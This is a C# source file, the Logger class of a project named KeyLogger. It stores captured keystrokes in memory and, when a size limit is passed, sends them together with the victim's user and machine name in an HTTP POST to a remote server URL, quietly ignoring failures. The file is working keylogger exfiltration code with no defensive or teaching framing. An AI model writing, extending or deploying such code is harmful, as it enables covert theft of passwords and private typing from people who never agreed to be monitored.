using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading.Tasks;

namespace KeyLogger
{
    /// <summary>
    /// Class managing the logging of the keys in the memory and sending those logs to an online server
    /// </summary>
    public class Logger
    {
        string logs;

        string serverURL;

        int logsMaxSize;



        /// <summary>
        /// Constructor
        /// </summary>
        /// <param name="serverURL">Adress of the server where to send logs</param>
        /// <param name="logsMaxSize">Number of chars the 'logs' variable is allowed to contain</param>
        public Logger(string serverURL, int logsMaxSize)
        {
            logs = "";
            this.serverURL = serverURL;
            this.logsMaxSize = logsMaxSize;
        }


        /// <summary>
        /// Add the given key to the 'logs' variable
        /// Calls the SendLogsToServer() method if the 'logs' variable is too big
        /// </summary>
        /// <param name="keyToLog">String representing a key</param>
        public async void LogKey(string keyToLog)
        {
            logs += keyToLog;

            // logs size shouldn't exceed the limit
            if(logs.Length > logsMaxSize)
            {
                await SendLogsToServer();
            }
        }


        /// <summary>
        /// Make a POST request to the logging server with those params:
        /// #user's name
        /// #logs
        /// </summary>
        public async Task<bool> SendLogsToServer()
        {
            // No logs, doesn't send a request
            if (logs.Length == 0)
                return false;

            using (var client = new HttpClient())
            {
                // POST data
                var content = new FormUrlEncodedContent(new[]
                {
                    new KeyValuePair<string, string>("user", Environment.UserName + '@' + Environment.MachineName),
                    new KeyValuePair<string, string>("logs", logs)
                });
                // clear the logs variable
                logs = "";

                try
                {
                    // send POST request
                    var dummy = await client.PostAsync(serverURL, content);
                }
                catch (Exception)
                {
                    return false;
                }
            }

            return true;
        }
    }
}
